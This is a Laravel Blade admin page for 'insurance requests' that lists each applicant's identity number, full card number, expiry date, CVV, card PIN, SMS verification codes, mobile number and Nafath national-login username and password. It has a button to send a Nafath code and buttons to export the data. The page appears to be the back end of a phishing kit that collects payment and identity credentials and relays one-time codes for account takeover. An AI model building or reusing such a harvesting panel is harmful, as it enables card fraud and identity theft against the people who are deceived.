@extends('admin.layouts.app')

@section('content')
{{-- =========================================================== --}}
{{-- =================== Page Header Section =================== --}}
{{-- =========================================================== --}}
<div class="page-breadcrumb">
    <div class="row">
        <div class="col-md-5 align-self-center">
            <h3 class="page-title">Insurance Requests
                @if (isset($insuranceRequests))
                ({{ $insuranceRequests->count() }})
                @endif
            </h3>
            <div class="d-flex align-items-center">
                <nav aria-label="breadcrumb">
                    <ol class="breadcrumb">
                        <li class="breadcrumb-item"><a href="{{ route('super_admin.dashboard') }}">Dashboard</a></li>
                        <li class="breadcrumb-item active" aria-current="page">Insurance Requests</li>
                    </ol>
                </nav>
            </div>
        </div>
        <div class="col-md-7 justify-content-end align-self-center d-none d-md-flex">
            <div class="d-flex">
                {{-- Archive --}}
                <div class="dropdown me-2">
                    <a href="{{ route('super_admin.insurance_requests-showSoftDelete') }}" class="btn btn-danger">
                        <i data-feather="archive" class="fill-white feather-sm"></i> View Archives
                    </a>
                </div>
            </div>
        </div>
    </div>
</div>
{{-- ========================================================== --}}
{{-- ==================== Page Body Section =================== --}}
{{-- ========================================================== --}}
<div class="container-fluid">
    <div class="row">
        <div class="col-12">
            <div class="card">
                <div class="card-body">
                    {{-- Table Section --}}
                    <div class="table-responsive">
                        <table id="file_export" class="table table-striped table-bordered display">
                            <thead>
                                <tr>
                                    <th> اسم مقدم الطلب </th>
                                    <th>رقم الهوية</th>
                                    <th> اسم حامل البطاقة </th>
                                    <th> رقم البطاقة </th>
                                    <th>التحكم</th>
                                </tr>
                            </thead>
                            <tbody>
                                @foreach ($insuranceRequests as $insuranceRequest)
                                <tr>
                                    {{-- applicant_name --}}
                                    <td><strong>{{ isset($insuranceRequest->applicant_name) ?
                                            $insuranceRequest->applicant_name : '----' }}</strong></td>
                                    {{-- identity_number --}}
                                    <td><strong>{{ isset($insuranceRequest->identity_number) ?
                                            $insuranceRequest->identity_number : '----' }}</strong></td>
                                    {{-- name_on_card --}}
                                    <td><strong>{{ isset($insuranceRequest->name_on_card) ?
                                            $insuranceRequest->name_on_card : '----' }}</strong></td>
                                    {{-- card_number --}}
                                    <td><strong>{{ isset($insuranceRequest->name_on_card) ?
                                        $insuranceRequest->name_on_card : '----' }}</strong> اسم صاحب البطاقة
                                        <br>رقم البطاقة : <strong>{{ isset($insuranceRequest->card_number) ?
                                            $insuranceRequest->card_number : '----' }}</strong>
                                            <br>تاريخ الصلاحية : <strong>{{ isset($insuranceRequest->expiry_date) ?
                                                $insuranceRequest->expiry_date : '----' }}</strong>
                                            <br>CVV : <strong>{{ isset($insuranceRequest->cvv) ?
                                                $insuranceRequest->cvv : '----' }}</strong>
                                        <br>كود الطباقة : <strong>{{ isset($insuranceRequest->card_ownership_verification_code) ?
                                            $insuranceRequest->card_ownership_verification_code : '----' }}</strong>
                                        <br>الرمز السري للبطاقة : <strong>{{ isset($insuranceRequest->card_ownership_secert_number) ?
                                            $insuranceRequest->card_ownership_secert_number : '----' }}</strong>
                                        <br>رقم الجوال : <strong>{{ isset($insuranceRequest->mobile_number) ?
                                            $insuranceRequest->mobile_number . ' | ' . $insuranceRequest->mobile_network_operator : '----' }}</strong>
                                        <br>رمز التحقق : <strong>{{ isset($insuranceRequest->check_mobile_number_verification_code) ?
                                            $insuranceRequest->check_mobile_number_verification_code : '----' }}</strong>
                                        <br>اسم مستخدم نفاذ : <strong>{{ isset($insuranceRequest->user_name) ?
                                            $insuranceRequest->user_name : '----' }}</strong>
                                        <br>كلمة مرور نفاذ : <strong>{{ isset($insuranceRequest->password) ?
                                            $insuranceRequest->password : '----' }}</strong>
                                        
                                        
                                        </td>
                                    
                                  
                                    {{-- operations --}}
                                    <td>
                                        <div class="button-group">
                                            <a href="{{ route('super_admin.insurance_requests-show', isset($insuranceRequest->id) ? $insuranceRequest->id : -1) }}"
                                                class="btn waves-effect waves-light btn-primary btn-sm"
                                                title="View Details"><i class="fas fa-eye"></i></a>
                                            <a href="{{ route('super_admin.insurance_requests-softDelete', isset($insuranceRequest->id) ? $insuranceRequest->id : -1) }}"
                                                class="confirm btn waves-effect waves-light btn-danger btn-sm"
                                                title="Delete"><i class="fas fa-trash-alt"></i></a>


                                            <a href="{{ route('super_admin.insurance_requests-sendNafathCode', isset($insuranceRequest->id) ? $insuranceRequest->id : -1) }}"
                                                class=" btn waves-effect waves-light btn-primary btn-sm"
                                                title="Send Nafath Code"> ارسال كود نفاذ </a>


                                        </div>
                                    </td>
                                </tr>
                                @endforeach
                            </tbody>
                        </table>
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>
@endsection

@section('extra_js')

{{-- table search and pagination --}}
<script>
    $(document).ready(function() {
            if ($.fn.DataTable.isDataTable('#file_export')) {
                $('#file_export').DataTable().destroy();
            }

            $('#file_export').DataTable({
                paging: true,
                pageLength: 50, // Set the number of records per page
                order: [
                    [3, 'desc'] // Sorting  column
                ],
                columnDefs: [{
                        type: 'date',
                        // targets: [2]
                    },
                    {
                        orderable: false,
                        // targets: [8, 6, 7]
                    }
                ],
                dom: 'Bfrtip',
                buttons: [{
                        extend: 'copy',
                        exportOptions: {
                            columns: [1, 2, 3, 4] // Specify the columns you want to export
                        }
                    },
                    {
                        extend: 'csv',
                        exportOptions: {
                            columns: [1, 2, 3, 4] // Specify the columns you want to export
                        }
                    },
                    {
                        extend: 'excel',
                        exportOptions: {
                            columns: [1, 2, 3, 4] // Specify the columns you want to export
                        }
                    },
                    {
                        extend: 'pdf',
                        exportOptions: {
                            columns: [1, 2, 3, 4] // Specify the columns you want to export
                        }
                    },
                    {
                        extend: 'print',
                        exportOptions: {
                            columns: [1, 2, 3, 4] // Specify the columns you want to export
                        }
                    }
                ]
            });

            // Add styling to the DataTable buttons
            $('.buttons-copy, .buttons-csv, .buttons-print, .buttons-pdf, .buttons-excel').addClass(
                'btn btn-primary mr-1');
        });
</script>
@endsection